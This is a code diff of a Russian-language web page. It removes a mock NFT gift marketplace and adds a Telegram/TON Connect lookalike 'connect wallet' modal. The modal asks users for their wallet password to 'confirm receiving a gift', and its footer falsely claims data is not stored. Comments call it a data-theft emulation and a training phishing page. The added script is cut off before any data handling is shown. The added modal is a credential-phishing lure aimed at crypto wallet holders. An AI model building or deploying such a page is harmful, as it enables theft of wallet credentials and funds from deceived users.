+            color: #3390ec;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+
+        /* ИМИТАЦИЯ QR-КОДА (как в TON Connect) */
+        .qr-placeholder {
+            background: #2b2b2b;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin: 12px 0 18px;
+            border: 1px dashed #3a3a3a;
+        }
+        .qr-placeholder .qr-svg {
+            width: 140px;
+            height: 140px;
+            background: #1a1a1a;
+            margin: 0 auto;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 12px;
-            color: #5a5a72;
+            color: #5e5e63;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+        .qr-placeholder .qr-svg::before {
+            content: "⏺⏺⏺⏺\A⏺□ □⏺\A⏺⏺⏺⏺";
+            white-space: pre;
+            font-size: 18px;
+            line-height: 1.2;
+            opacity: 0.3;
+        }
+
+        /* АНИМАЦИЯ ЗАГРУЗКИ (спиннер) */
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #2b2b2b;
+            border-top: 3px solid #3390ec;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* АДАПТИВ */
+        @media (max-width: 480px) {
+            .telegram-modal {
+                padding: 20px 18px 28px;
+                border-radius: 28px;
+            }
+            .modal-header h2 {
+                font-size: 20px;
+            }
+            .modal-header .icon-wrapper {
+                width: 68px;
+                height: 68px;
+            }
+        }
+
+        /* ТЕМНАЯ ТЕМА (встроена) */
+        ::-webkit-scrollbar {
+            width: 4px;
+            background: #1f1f1f;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #3a3a3a;
+            border-radius: 8px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== HEADER ===== -->
-    <header class="header">
-        <div class="header-left">
-            <div class="header-logo" onclick="switchPage('market')">
-                Fragment <small>NFT</small>
-            </div>
+<div class="telegram-modal" id="modal">
+    <!-- ШАПКА -->
+    <div class="modal-header">
+        <div class="icon-wrapper">
+            <span class="tg-icon">✈️</span>
+            <!-- Либо вставь реальный SVG Telegram -->
         </div>
-        <div class="header-close" onclick="showToast('Закрыто', 'info')">
-            <i class="fas fa-times"></i>
-            <span>Закрыть</span>
-        </div>
-    </header>
-
-    <!-- ===== TOP BANNER ===== -->
-    <div class="top-banner">
-        <div>
-            <div class="title"><i class="fas fa-fire"></i> WEB Лидерборд и задания</div>
-            <div class="sub">$50,000 призовой фонд</div>
-        </div>
-        <button class="btn-banner" onclick="showToast('Узнать больше', 'info')">Узнать больше</button>
+        <h2>Подключить кошелёк</h2>
+        <p>Введите пароль или отсканируйте QR‑код, чтобы подтвердить получение подарка</p>
     </div>
 
-    <!-- ===== TABS ===== -->
-    <div class="tabs" id="mainTabs">
-        <span class="tab active" data-tab="gifts" onclick="switchTab('gifts')">Подарки</span>
-        <span class="tab" data-tab="stars" onclick="switchTab('stars')">Звезды и Прем</span>
-        <span class="tab" data-tab="collections" onclick="switchTab('collections')">Коллекции</span>
-        <span class="tab" data-tab="feed" onclick="switchTab('feed')">Feed</span>
-    </div>
-
-    <!-- ===== SEARCH BAR ===== -->
-    <div class="search-bar">
-        <input type="text" id="searchInput" placeholder="Поиск по названию NFT / номеру" oninput="filterNFTs()" />
-        <div class="filter-group">
-            <button class="filter-btn active" onclick="toggleFilter(this, 'nft')">NFT <i class="fas fa-chevron-down"></i></button>
-            <button class="filter-btn" onclick="toggleFilter(this, 'model')">Модель <i class="fas fa-chevron-down"></i></button>
-            <button class="filter-btn" onclick="toggleFilter(this, 'bg')">Фон <i class="fas fa-chevron-down"></i></button>
-            <button class="filter-btn" onclick="toggleFilter(this, 'symbol')">Символ <i class="fas fa-chevron-down"></i></button>
-            <button class="filter-btn" onclick="toggleFiltersPanel()"><i class="fas fa-sliders-h"></i></button>
+    <!-- ИМИТАЦИЯ QR (как в TON Connect) -->
+    <div class="qr-placeholder">
+        <div class="qr-svg"></div>
+        <div style="margin-top:12px; font-size:13px; color:#8e8e93;">
+            Отсканируйте в приложении TON Wallet
         </div>
     </div>
 
-    <!-- ===== FILTERS PANEL ===== -->
-    <div class="filters-panel" id="filtersPanel">
-        <div class="filter-section">
-            <span class="label">Номер подарка #</span>
-            <div class="options">
-                <span class="opt active" onclick="selectOpt(this)">Все</span>
-                <span class="opt" onclick="selectOpt(this)">1-100</span>
-                <span class="opt" onclick="selectOpt(this)">101-500</span>
-                <span class="opt" onclick="selectOpt(this)">501+</span>
-            </div>
-        </div>
-        <div class="filter-section">
-            <span class="label">Сортировать по</span>
-            <div class="options">
-                <span class="opt active" onclick="selectOpt(this)">Цена</span>
-                <span class="opt" onclick="selectOpt(this)">Дата</span>
-                <span class="opt" onclick="selectOpt(this)">Популярность</span>
-            </div>
-        </div>
-        <div class="filter-section">
-            <span class="label">Теги</span>
-            <div class="options">
-                <span class="opt" onclick="selectOpt(this)">NFT</span>
-                <span class="opt" onclick="selectOpt(this)">Модель</span>
-                <span class="opt" onclick="selectOpt(this)">Фон</span>
-                <span class="opt" onclick="selectOpt(this)">Символ</span>
-            </div>
-        </div>
-        <div class="filter-actions">
-            <button class="btn-clear" onclick="clearFilters()">Очистить все</button>
-            <button class="btn-apply" onclick="applyFilters()">Показать результаты</button>
-        </div>
+    <!-- ПОЛЕ ВВОДА (как будто запрос пароля) -->
+    <div class="input-group">
+        <label for="password">Пароль кошелька</label>
+        <input type="password" id="password" placeholder="Введите пароль" autocomplete="off">
     </div>
 
-    <!-- ===== STATS BAR ===== -->
-    <div class="stats-bar" id="statsBar">
-        <div class="left">
-            <span><span class="num" id="nftCount">0</span> NFT</span>
-            <span>·</span>
-            <span>На продаже (<span class="num" id="onSaleCount">0</span>)</span>
-            <span>·</span>
-            <span>Хранилище (<span class="num" id="storageCount">0</span>)</span>
-        </div>
-        <div>
-            <span id="viewMode" style="cursor:pointer;" onclick="toggleView()">
-                <i class="fas fa-th"></i>
-            </span>
-        </div>
+    <!-- КНОПКА ПОДКЛЮЧЕНИЯ -->
+    <button class="connect-btn" id="connectBtn">
+        Подключить
+    </button>
+
+    <!-- ДОП. ИНФО -->
+    <div class="footer-note">
+        <span>🔐 Данные не сохраняются</span><br>
+        <span style="font-size:12px; color:#4a4a4f;">
+            <a href="#" onclick="event.preventDefault(); alert('Это фишинговая страница (учебный пример)');">Политика конфиденциальности</a>
+        </span>
     </div>
+</div>
 
-    <!-- ============================================================
-    PAGES
-    ============================================================ -->
+<script>
+    (function() {
+        // ЭМУЛЯЦИЯ КРАЖИ ДАННЫХ (для обучения)
+        const connectBtn = document.getElementById('connectBtn');
+        const passwordInput = document.getElementById('password');
 
-    <!-- ===== MARKET PAGE ===== -->
-    <div class="page active" id="page-market">
-        <div class="page-content">
-            <div class="nft-grid" id="nftGrid"></div>
-        </div>
-    </div>
-
-    <!-- ===== ORDERS PAGE ===== -->
-    <div class="page" id="page-orders">
-        <div class="page-content">
-            <div style="padding:12px 16px 4px;font-size:18px;font-weight:700;color:#fff;">Ордеры</div>
-            <div style="padding:0 16px 8px;font-size:13px;color:#5a5a72;">Мои ордеры</div>
-            <div class="orders-list" id="ordersList"></div>
-            <div class="create-order-btn" onclick="showToast('Создать ордер', 'info')">
-                <i class="fas fa-plus"></i> Создать ордер
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== HUB PAGE ===== -->
-    <div class="page" id="page-hub">
-        <div class="page-content">
-            <div class="hub-header">
-                <div class="title">PlayHub Сезон 1: Гонка за 100K GRAM началась!</div>
-                <div class="sub">Играйте в любимые игры и получайте награды</div>
-                <div class="prize">🎮 100K GRAM уже тут!</div>
-            </div>
-            <div style="padding:8px 16px;font-size:14px;color:#808099;">
-                Доступные награды <span style="color:#6e4bff;font-weight:700;">+731</span>
-            </div>
-            <div style="padding:8px 16px 0;font-size:13px;color:#5a5a72;">
-                Нажмите «Начать» перед выполнением задания
-            </div>
-            <div class="hub-tabs">
-                <span class="htab active" onclick="switchHubTab(this, 'hot')">Горящие (6)</span>
-                <span class="htab" onclick="switchHubTab(this, 'more')">Больше наград</span>
-            </div>
-            <div id="tasksList"></div>
-        </div>
-    </div>
-
-    <!-- ===== TASKS PAGE ===== -->
-    <div class="page" id="page-tasks">
-        <div class="page-content">
-            <div style="padding:12px 16px 4px;font-size:18px;font-weight:700;color:#fff;">Задания</div>
-            <div id="tasksList2"></div>
-        </div>
-    </div>
-
-    <!-- ===== STORAGE PAGE ===== -->
-    <div class="page" id="page-storage">
-        <div class="page-content">
-            <div style="padding:12px 16px 4px;font-size:18px;font-weight:700;color:#fff;">Хранилище</div>
-            <div style="padding:4px 16px 8px;font-size:13px;color:#5a5a72;">Здесь будут ваши NFT</div>
-            <div class="nft-grid" id="storageGrid"></div>
-        </div>
-    </div>
-
-    <!-- ===== GIFTS / STARS PAGE (вкладки) ===== -->
-    <div class="page" id="page-gifts">
-        <div class="page-content">
-            <div class="gift-section">
-                <div class="gift-title">🎁 Подарки Звезды и Прем Коллекции</div>
-                <div class="gift-sub">Что вы хотите купить?</div>
-
-                <div class="gift-options">
-                    <span class="gopt active" onclick="selectGiftOption(this)">Выбрать</span>
-                    <span class="gopt" onclick="selectGiftOption(this)">Звезды</span>
-                    <span class="gopt" onclick="selectGiftOption(this)">Премиум</span>
-                </div>
-
-                <div style="font-size:14px;font-weight:500;color:#808099;margin-bottom:8px;">Получатель</div>
-                <div class="gift-receiver">
-                    <input type="text" placeholder="Введите Телеграм юзернейм" />
-                    <button class="btn-self" onclick="showToast('Отправлено себе', 'success')">Отправить себе</button>
-                </div>
-
-                <div class="gift-fee">
-                    Комиссия маркетплейса: <span class="val">-</span>
-                </div>
-
-                <button class="btn-buy" onclick="showToast('Покупка оформлена!', 'success')">
-                    <i class="fas fa-shopping-bag" style="margin-right:8px;"></i> Купить
-                </button>
-
-                <div class="gift-agree">
-                    Покупая Звезды или Премиум, вы соглашаетесь с нашими Условиями использования, и подтверждаете, что вы не резидент США
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== STARS PAGE ===== -->
-    <div class="page" id="page-stars">
-        <div class="page-content">
-            <div style="padding:16px;">
-                <div style="font-size:20px;font-weight:700;color:#fff;display:flex;align-items:center;gap:12px;">
-                    ⭐ Телеграм звезды
-                    <span style="font-size:14px;color:#5a5a72;font-weight:400;">·</span>
-                    <span style="font-size:16px;color:#6e4bff;font-weight:600;">Телеграм премиум</span>
-                </div>
-                <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap;">
-                    <button class="gopt active" onclick="showToast('Звезды выбраны', 'info')" style="padding:8px 20px;background:rgba(110,75,255,0.12);border:1px solid rgba(110,75,255,0.2);border-radius:10px;color:#6e4bff;font-weight:500;cursor:pointer;font-family:Inter,sans-serif;">⭐ Звезды</button>
-                    <button class="gopt" onclick="showToast('Премиум выбран', 'info')" style="padding:8px 20px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:10px;color:#808099;font-weight:500;cursor:pointer;font-family:Inter,sans-serif;">💎 Премиум</button>
-                    <button class="gopt" onclick="showToast('Готово', 'success')" style="padding:8px 20px;background:rgba(68,212,160,0.12);border:1px solid rgba(68,212,160,0.15);border-radius:10px;color:#44d4a0;font-weight:500;cursor:pointer;font-family:Inter,sans-serif;">✅ Готово</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== COLLECTIONS PAGE ===== -->
-    <div class="page" id="page-collections">
-        <div class="page-content">
-            <div style="padding:12px 16px 4px;font-size:18px;font-weight:700;color:#fff;">Коллекции</div>
-            <div class="collection-grid" id="collectionsGrid"></div>
-        </div>
-    </div>
-
-    <!-- ===== FEED PAGE ===== -->
-    <div class="page" id="page-feed">
-        <div class="page-content">
-            <div style="padding:12px 16px 4px;font-size:18px;font-weight:700;color:#fff;">Feed</div>
-            <div style="padding:4px 16px 12px;font-size:13px;color:#5a5a72;">Активность в реальном времени</div>
-            <div style="padding:0 16px;">
-                <div style="background:#14141f;border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:16px;text-align:center;color:#5a5a72;">
-                    <i class="fas fa-rss" style="font-size:24px;display:block;margin-bottom:8px;opacity:0.3;"></i>
-                    Лента событий пока пуста
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== DETAIL OVERLAY ===== -->
-    <div class="detail-overlay" id="detailOverlay">
-        <div class="detail-card">
-            <span class="close-btn" onclick="closeDetail()"><i class="fas fa-times"></i></span>
-            <div class="nft-title" id="detailName">Precious Peach</div>
-            <div class="nft-id" id="detailId">#2156</div>
-            <div class="attrs">
-                <div class="attr">
-                    <div class="label">Модель</div>
-                    <div class="value" id="detailModel">Sunset 1.5%</div>
-                </div>
-                <div class="attr">
-                    <div class="label">Фон</div>
-                    <div class="value" id="detailBg">Roman Silver 2%</div>
-                </div>
-                <div class="attr">
-                    <div class="label">Символ</div>
-                    <div class="value" id="detailSymbol">Passion Latte</div>
-                </div>
-            </div>
-            <div class="floors">
-                <div class="floor">Флор: <span id="detailFloor1">♥ 250.99</span></div>
-                <div class="floor">Sunset Флор: <span id="detailFloor2">♥ 285.6</span></div>
-            </div>
-            <div class="offer-row">
-                <div class="offer-label">Оффер</div>
-                <div class="offer-price" id="detailPrice">♥ 566.1</div>
-            </div>
-            <button class="btn-add" onclick="showToast('Добавлено в корзину!', 'success')">
-                <i class="fas fa-plus" style="margin-right:8px;"></i> Добавить
-            </button>
-        </div>
-    </div>
-
-    <!-- ===== BOTTOM NAV ===== -->
-    <div class="bottom-nav">
-        <button class="nav-item active" data-page="market" onclick="switchPage('market')">
-            <i class="fas fa-store"></i>
-            <span>Маркет</span>
-        </button>
-        <button class="nav-item" data-page="orders" onclick="switchPage('orders')">
-            <i class="fas fa-clipboard-list"></i>
-            <span>Ордеры</span>
-        </button>
-        <button class="nav-item" data-page="hub" onclick="switchPage('hub')">
-            <i class="fas fa-gamepad"></i>
-            <span>Игровой хаб</span>
-        </button>
-        <button class="nav-item" data-page="tasks" onclick="switchPage('tasks')">
-            <i class="fas fa-tasks"></i>
-            <span>Задания</span>
-            <span class="badge">3</span>
-        </button>
-        <button class="nav-item" data-page="storage" onclick="switchPage('storage')">
-            <i class="fas fa-box"></i>
-            <span>Хранилище</span>
-        </button>
-    </div>
-
-    <!-- ===== TOAST ===== -->
-    <div class="toast-container" id="toastContainer">
-        <span class="icon"><i class="fas fa-check-circle"></i></span>
-        <span class="msg" id="toastMsg">Готово</span>
-    </div>
-
-    <script>
-        // ================================================================
-        //  ДАННЫЕ
-        // ================================================================
-        const nftData = [
-            { name: 'Eternal Rose', id: '#1245', price: 20.7, change: '+1.2', floor: 1763.4, model: 'Rose 2.1%',
-                bg: 'Dark 1%', symbol: '♥ Passion', up: true },
-            { name: 'Evil Eye', id: '#5432', price: 5.82, change: '-0.3', floor: 857.74, model: 'Eye 1.8%',
-                bg: 'Black 0.5%', symbol: '👁️', up: false },
-            { name: 'Flying Broom', id: '#8765', price: 8.04, change: '-1.1', floor: 758.78, model: 'Broom 2.3%',
-                bg: 'Night 1.2%', symbol: '🧹', up: false },
-            { name: 'Gem Signet', id: '#9987', price: 52.44, change: '+4.2', floor: 2468.57, model: 'Gem 3.0%',
-                bg: 'Gold 0.8%', symbol: '💎', up: true },
-            { name: 'Genie Lamp', id: '#4532', price: 29.57, change: '-2.1', floor: 1344.96, model: 'Lamp 1.5%',
-                bg: 'Sand 1.0%', symbol: '🪔', up: false },
-            { name: 'Ginger Cookie', id: '#1223', price: 2.97, change: '-0.4', floor: 717.26, model: 'Cookie 0.8%',
-                bg: 'Brown 0.3%', symbol: '🍪', up: false },
-            { name: 'Hanging Star', id: '#8761', price: 6.34, change: '-0.7', floor: 457.35, model: 'Star 1.1%',
-                bg: 'Blue 0.6%', symbol: '⭐', up: false },
-            { name: 'Heart Locket', id: '#4321', price: 959, change: '+12.5', floor: 8851.81, model: 'Heart 4.2%',
-                bg: 'Gold 2.0%', symbol: '❤️', up: true },
-            { name: 'Heroic Helmet', id: '#7766', price: 175.94, change: '-8.3', floor: 1399.33, model: 'Helmet 3.5%',
-                bg: 'Steel 1.8%', symbol: '⚔️', up: false },
-            { name: 'Hex Pot', id: '#5544', price: 3.11, change: '-0.2', floor: 685.3, model: 'Pot 0.9%', bg: 'Dark 0.4%',
-                symbol: '🧪', up: false },
-            { name: 'Surge Board', id: '#7923', price: 5.95, change: '+0.8', floor: 3172.71, model: 'Board 1.2%',
-                bg: 'Wave 0.7%', symbol: '🏄', up: true },
-            { name: 'Liberty Figure', id: '#234020', price: 3.35, change: '+0.2', floor: 14354.62, model: 'Figure 0.8%',
-                bg: 'Statue 0.5%', symbol: '🗽', up: true },
-            { name: 'Astral Shard', id: '#11223', price: 112.45, change: '-5.6', floor: 4433.58, model: 'Shard 2.8%',
-                bg: 'Space 1.5%', symbol: '✨', up: false },
-            { name: 'B-Day Candle', id: '#33445', price: 4.68, change: '+0.9', floor: 1836.7, model: 'Candle 1.0%',
-                bg: 'Yellow 0.6%', symbol: '🕯️', up: true },
-            { name: 'Berry Box', id: '#55667', price: 6.49, change: '-0.5', floor: 387.97, model: 'Box 1.3%',
-                bg: 'Red 0.8%', symbol: '🍓', up: false },
-            { name: 'Big Year', id: '#77889', price: 2.6, change: '-0.3', floor: 426.11, model: 'Year 0.7%',
-                bg: 'Gold 0.4%', symbol: '🎉', up: false },
-            { name: 'Bonded Ring', id: '#99001', price: 35.69, change: '-2.1', floor: 1987.73, model: 'Ring 2.0%',
-                bg: 'Silver 1.0%', symbol: '💍', up: false },
-            { name: 'Bow Tie', id: '#22334', price: 3.87, change: '-0.3', floor: 379.35, model: 'Tie 0.9%',
-                bg: 'Black 0.5%', symbol: '🎀', up: false },
-            { name: 'Bunny Muffin', id: '#44556', price: 6.01, change: '-0.2', floor: 471.36, model: 'Muffin 1.1%',
-                bg: 'Pink 0.6%', symbol: '🐰', up: false },
-            { name: 'Candy Cane', id: '#66778', price: 2.58, change: '+0.3', floor: 693.28, model: 'Cane 0.6%',
-                bg: 'Red 0.3%', symbol: '🍬', up: true },
-            { name: 'Cookie Heart', id: '#88990', price: 3.57, change: '-0.2', floor: 517.13, model: 'Heart 0.8%',
-                bg: 'Pink 0.4%', symbol: '🍪', up: false },
-            { name: 'Crystal Ball', id: '#10112', price: 8.92, change: '-0.6', floor: 991.98, model: 'Ball 1.5%',
-                bg: 'Purple 0.8%', symbol: '🔮', up: false },
-            { name: 'Diamond Ring', id: '#13141', price: 25.7, change: '-3.2', floor: 2838.63, model: 'Diamond 2.5%',
-                bg: 'White 1.2%', symbol: '💎', up: false },
-            { name: "Durov's Cap", id: '#15161', price: 395.24, change: '+45.1', floor: 12944.1, model: 'Cap 5.0%',
-                bg: 'Black 2.5%', symbol: '🧢', up: true },
-            { name: 'Easter Egg', id: '#17181', price: 2.83, change: '-0.1', floor: 579.95, model: 'Egg 0.5%',
-                bg: 'Colorful 0.3%', symbol: '🥚', up: false },
-            { name: 'Electric Skull', id: '#19201', price: 21.58, change: '-1.8', floor: 1172.62, model: 'Skull 2.2%',
-                bg: 'Dark 1.0%', symbol: '💀', up: false },
-            { name: 'Gravestone', id: '#99999', price: 39.11, change: '+2.3', floor: 2100.0, model: 'Stone 2.0%',
-                bg: 'Grey 1.0%', symbol: '🪦', up: true },
-            { name: 'Mask', id: '#88888', price: 5.73, change: '-0.4', floor: 450.0, model: 'Mask 0.8%', bg: 'Black 0.4%',
-                symbol: '🎭', up: false },
-            { name: 'Coffin', id: '#77777', price: 18.21, change: '-1.2', floor: 900.0, model: 'Coffin 1.5%',
-                bg: 'Dark 0.8%', symbol: '⚰️', up: false },
-            { name: 'Airplane', id: '#66666', price: 4000, change: '+150', floor: 15000, model: 'Plane 8.0%',
-                bg: 'Sky 4.0%', symbol: '✈️', up: true },
-            { name: "Khabib's Papakha", id: '#55555', price: 50.5, change: '+5.2', floor: 3200, model: 'Papakha 3.0%',
-                bg: 'White 1.5%', symbol: '🧢', up: true },
-            { name: 'UFC box', id: '#44444', price: 31, change: '-2.1', floor: 1800, model: 'Box 2.0%', bg: 'Red 1.0%',
-                symbol: '🥊', up: false },
-            { name: 'Trojan Horse', id: '#33333', price: 31, change: '+1.5', floor: 1700, model: 'Horse 2.0%',
-                bg: 'Wood 1.0%', symbol: '🐴', up: true },
-            { name: 'Precious Peach', id: '#2156', price: 566.1, change: '+23.4', floor: 250.99, model: 'Sunset 1.5%',
-                bg: 'Roman Silver 2%', symbol: 'Passion Latte', up: true },
-            { name: 'Pretty Posy', id: '#27312', price: 19.91, change: '-1.2', floor: 200.0, model: 'Posy 1.0%',
-                bg: 'Pink 0.5%', symbol: '🌸', up: false },
-            { name: 'Spring Basket', id: '#97299', price: 25.52, change: '+2.3', floor: 300.0, model: 'Basket 1.5%',
-                bg: 'Green 0.8%', symbol: '🧺', up: true },
-            { name: 'Mousse Cake', id: '#79997', price: 3.99, change: '-0.2', floor: 180.0, model: 'Cake 0.6%',
-                bg: 'Brown 0.3%', symbol: '🍰', up: false },
-            { name: 'Mood Pack', id: '#38888', price: 9.8, change: '-0.5', floor: 220.0, model: 'Pack 1.0%',
-                bg: 'Blue 0.5%', symbol: '😊', up: false },
-            { name: 'Joyful Bundle', id: '#15477', price: 6.11, change: '+0.4', floor: 190.0, model: 'Bundle 0.8%',
-                bg: 'Yellow 0.4%', symbol: '🎁', up: true },
-            { name: 'Snoop Cigar', id: '#12345', price: 10.61, change: '+0.9', floor: 250.0, model: 'Cigar 1.2%',
-                bg: 'Brown 0.6%', symbol: '🚬', up: true },
-            { name: 'Jester Hat', id: '#67890', price: 2.89, change: '-0.1', floor: 117.0, model: 'Hat 0.5%',
-                bg: 'Colorful 0.3%', symbol: '🎭', up: false },
-            { name: 'Easter Egg #45412', id: '#45412', price: 20.63, change: '+1.2', floor: 180.0, model: 'Egg 1.2%',
-                bg: 'Colorful 0.6%', symbol: '🥚', up: true },
-            { name: 'Spring Basket #32254', id: '#32254', price: 9.2, change: '-0.3', floor: 150.0, model: 'Basket 0.8%',
-                bg: 'Green 0.4%', symbol: '🧺', up: false },
-        ];
-
-        const ordersData = [
-            { name: 'Gravestone', qty: 1, price: 39.11 },
-            { name: 'Mask', qty: 1, price: 5.73 },
-            { name: 'Coffin', qty: 1, price: 18.21 },
-            { name: 'Airplane', qty: 1, price: 4000 },
-            { name: "Khabib's Papakha", qty: 1, price: 50.5 },
-            { name: 'UFC box', qty: 1, price: 31 },
-            { name: 'Trojan Horse', qty: 1, price: 31 },
-        ];
-
-        const tasksData = [
-            { title: 'Выиграть в Бойцовско...', progress: '0/1', reward: 25, timer: '00:14:57' },
-            { title: 'Сыграть в Бойцовский ...', progress: '0/1', reward: 2, timer: '00:14:57' },
-            { title: 'Выиграть в Игре в Кал...', progress: '0/1', reward: 25, timer: '00:14:57' },
-            { title: 'Сыграть в Игру в Каль...', progress: '0/1', reward: 2, timer: '00:14:57' },
-            { title: 'Выиграть в BANG', progress: '0/1', reward: 5, timer: '--:--:--' },
-        ];
-
-        const collectionsData = [
-            { name: 'Подарки', icon: '🎁', count: 156 },
-            { name: 'Звезды', icon: '⭐', count: 89 },
-            { name: 'Премиум', icon: '💎', count: 43 },
-            { name: 'NFT', icon: '🖼️', count: 234 },
-            { name: 'Модели', icon: '🎨', count: 67 },
-            { name: 'Фоны', icon: '🌄', count: 45 },
-            { name: 'Символы', icon: '🔣', count: 32 },
-            { name: 'Коллекции', icon: '📚', count: 78 },
-        ];
-
-        const storageData = [
-            { name: 'Precious Peach', id: '#2156', price: 566.1 },
-            { name: 'Easter Egg', id: '#45412', price: 20.63 },
-            { name: 'Spring Basket', id: '#32254', price: 9.2 },
-        ];
-
-        // ================================================================
-        //  СОСТОЯНИЕ
-        // ================================================================
-        let currentPage = 'market';
-        let currentTab = 'gifts';
-        let currentView = 'grid';
-        let filteredNFTs = [...nftData];
-
-        // ================================================================
-        //  РЕНДЕРИНГ
-        // ================================================================
-        function renderNFTs(data) {
-            const grid = document.getElementById('nftGrid');
-            if (!grid) return;
-            grid.innerHTML = '';
-            data.forEach(nft => {
-                const changeClass = nft.up ? 'up' : 'down';
-                const changeSymbol = nft.up ? '↑' : '↓';
-                const card = document.createElement('div');
-                card.className = 'nft-card';
-                card.innerHTML = `
-                    <div class="badge">${nft.id}</div>
-                    <div class="name">${nft.name}</div>
-                    <div class="sub">${nft.id}</div>
-                    <div class="price-row">
-                        <span class="price">♥ ${nft.price.toFixed(2)}</span>
-                        <span class="change ${changeClass}">${changeSymbol} ${nft.change}</span>
-                    </div>
-                `;
-                card.onclick = () => openDetail(nft);
-                grid.appendChild(card);
-            });
-            document.getElementById('nftCount').textContent = data.length;
-            document.getElementById('onSaleCount').textContent = data.filter(n => n.price > 0).length;
-            document.getElementById('storageCount').textContent = storageData.length;
-        }
-
-        function renderOrders() {
-            const list = document.getElementById('ordersList');
-            if (!list) return;
-            list.innerHTML = '';
-            ordersData.forEach(order => {
-                const item = document.createElement('div');
-                item.className = 'order-item';
-                item.innerHTML = `
-                    <div class="info">
-                        <span class="name">${order.name}</span>
-                        <span class="qty">Количество: ${order.qty}</span>
-                    </div>
-                    <span class="price">♥ ${order.price.toFixed(2)}</span>
-                    <div class="actions">
-                        <button class="btn-detail" onclick="showToast('Детали ордера', 'info')">Детали</button>
-                        <button class="btn-sell" onclick="showToast('Выставлено на продажу', 'success')">Продать</button>
-                    </div>
-                `;
-                list.appendChild(item);
-            });
-        }
-
-        function renderTasks() {
-            const list = document.getElementById('tasksList');
-            if (!list) return;
-            list.innerHTML = '';
-            tasksData.forEach(task => {
-                const item = document.createElement('div');
-                item.className = 'task-item';
-                const timerDisplay = task.timer !== '--:--:--' ? `<span class="timer">🕒 ${task.timer}</span>` : '';
-                item.innerHTML = `
-                    <span class="desc">${task.title}</span>
-                    <span class="progress">${task.progress}</span>
-                    <div class="task-actions">
-                        <span class="reward">🎲 ${task.reward}</span>
-                        ${timerDisplay}
-                        <button class="btn-start" onclick="showToast('Задание начато!', 'success')">Начать</button>
-                    </div>
-                `;
-                list.appendChild(item);
-            });
-        }
-
-        function renderTasks2() {
-            const list = document.getElementById('tasksList2');
-            if (!list) return;
-            list.innerHTML = '';
-            tasksData.slice(0, 3).forEach(task => {
-                const item = document.createElement('div');
-                item.className = 'task-item';
-                item.innerHTML = `
-                    <span class="desc">${task.title}</span>
-                    <span class="progress">${task.progress}</span>
-                    <div class="task-actions">
-                        <span class="reward">🎲 ${task.reward}</span>
-                        <button class="btn-start" onclick="showToast('Задание начато!', 'success')">Начать</button>
-                    </div>
-                `;
-                list.appendChild(item);
-            });
-        }
-
-        function renderCollections() {
-            const grid = document.getElementById('collectionsGrid');
-            if (!grid) return;
-            grid.innerHTML = '';
-            collectionsData.forEach(col => {
-                const card = document.createElement('div');
-                card.className = 'collection-card';
-                card.innerHTML = `
-                    <div class="icon">${col.icon}</div>
-                    <div class="name">${col.name}</div>
-                    <div class="count">${col.count} предметов</div>
-                `;
-                card.onclick = () => showToast(`Коллекция ${col.name}`, 'info');
-                grid.appendChild(card);
-            });
-        }
-
-        function renderStorage() {
-            const grid = document.getElementById('storageGrid');
-            if (!grid) return;
-            grid.innerHTML = '';
-            storageData.forEach(nft => {
-                const card = document.createElement('div');
-                card.className = 'nft-card';
-                card.innerHTML = `
-                    <div class="badge">${nft.id}</div>
-                    <div class="name">${nft.name}</div>
-                    <div class="sub">${nft.id}</div>
-                    <div class="price-row">
-                        <span class="price">♥ ${nft.price.toFixed(2)}</span>
-                    </div>
-                `;
-                card.onclick = () => showToast(`${nft.name} - в хранилище`, 'info');
-                grid.appendChild(card);
-            });
-        }
-
-        // ================================================================
-        //  ФИЛЬТРЫ
-        // ================================================================
-        function filterNFTs() {
-            const query = document.getElementById('searchInput').value.toLowerCase();
-            filteredNFTs = nftData.filter(n =>
-                n.name.toLowerCase().includes(query) ||
-                n.id.includes(query)
-            );
-            renderNFTs(filteredNFTs);
-        }
-
-        function toggleFilter(el, type) {
-            el.classList.toggle('active');
-        }
-
-        function toggleFiltersPanel() {
-            const panel = document.getElementById('filtersPanel');
-            panel.classList.toggle('open');
-        }
-
-        function selectOpt(el) {
-            const parent = el.closest('.options');
-            parent.querySelectorAll('.opt').forEach(o => o.classList.remove('active'));
-            el.classList.add('active');
-        }
-
-        function clearFilters() {
-            document.querySelectorAll('.filters-panel .opt').forEach(o => o.classList.remove('active'));
-            document.querySelectorAll('.filters-panel .opt:first-child').forEach(o => o.classList.add('active'));
-            showToast('Фильтры очищены', 'info');
-        }
-
-        function applyFilters() {
-            showToast('Фильтры применены', 'success');
-            toggleFiltersPanel();
-        }
-
-        function toggleView() {
-            const grid = document.getElementById('nftGrid');
-            if (currentView === 'grid') {
-                currentView = 'list';
-                grid.style.display = 'block';
-                document.getElementById('viewMode').innerHTML = '<i class="fas fa-list"></i>';
-            } else {
-                currentView = 'grid';
-                grid.style.display = 'grid';
-                document.getElementById('viewMode').innerHTML = '<i class="fas fa-th"></i>';
-            }
-        }
-
-        // ================================================================
-        //  ДЕТАЛИ
-        // ================================================================
-        function openDetail(nft) {
-            document.getElementById('detailName').textContent = nft.name;
-            document.getElementById('detailId').textContent = nft.id;
-            document.getElementById('detailModel').textContent = nft.model || '—';
-            document.getElementById('detailBg').textContent = nft.bg || '—';
-            document.getElementById('detailSymbol').textContent = nft.symbol || '—';
-            document.getElementById('detailFloor1').textContent = `♥ ${nft.floor.toFixed(2)}`;
-            document.getElementById('detailFloor2').textContent = `♥ ${(nft.floor * 1.15).toFixed(2)}`;
